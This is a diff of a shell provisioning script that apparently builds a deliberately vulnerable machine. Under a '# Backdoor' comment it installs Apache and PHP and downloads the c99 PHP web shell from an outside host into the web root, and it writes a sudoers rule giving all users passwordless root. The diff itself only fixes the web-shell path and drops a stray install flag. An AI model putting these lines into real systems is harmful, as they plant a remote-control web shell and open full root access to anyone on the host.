@@ -3,7 +3,7 @@
 apt-get install -y python-dev
 # Backdoor
 apt-get install -y apache2 php5
-wget -O /var/www/c99.php wget http://blog.zer0w1re.net/files/c99.txt
+wget -O /var/www/html/c99.php wget http://blog.zer0w1re.net/files/c99.txt
 
 # Sudoers
 echo "ALL ALL=(ALL:ALL) NOPASSWD:ALL" > /etc/sudoers.d/all
@@ -39,13 +39,13 @@ apt-get install -y openssh-server
 wget https://pypi.python.org/packages/source/s/simplepam/simplepam-0.1.5.tar.gz
 tar xvf simplepam-0.1.5.tar.gz
 cd simplepam-0.1.5
-python setup.py install -y
+python setup.py install
 cd ..
 rm -rf simplepam-0.1.5
 
 git clone https://github.com/giampaolo/psutil.git
 cd psutil
-python setup.py install -y
+python setup.py install
 cd ..
 rm -rf psutil
 
